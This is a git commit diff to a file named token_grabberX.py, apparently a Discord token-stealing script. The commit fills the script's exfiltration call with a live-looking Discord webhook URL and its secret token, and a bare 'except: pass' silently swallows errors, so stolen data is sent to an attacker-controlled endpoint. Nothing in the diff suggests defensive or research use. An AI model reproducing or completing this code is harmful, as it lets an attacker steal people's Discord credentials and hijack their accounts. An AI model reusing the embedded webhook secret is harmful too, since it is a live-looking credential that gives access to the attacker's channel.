3f03c9c96a9e53fe505a131e70b076e4d857d9d5
joguuguyg <johnweatherman109@gmail.com>
2025-02-19 10:48:54 -0600

    Update token_grabberX.py

--- token_grabberX.py
+++ token_grabberX.py
@@ -370,7 +370,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("YOUR WEEBHOOK LINK HERE", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/1341800514181926994/YRslKr3LyxnuIOtQqCcay2rKTvNsrr6Z8LwU9dGH2NSs4UMQwZtVjukG8fDqUTzKi7To", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
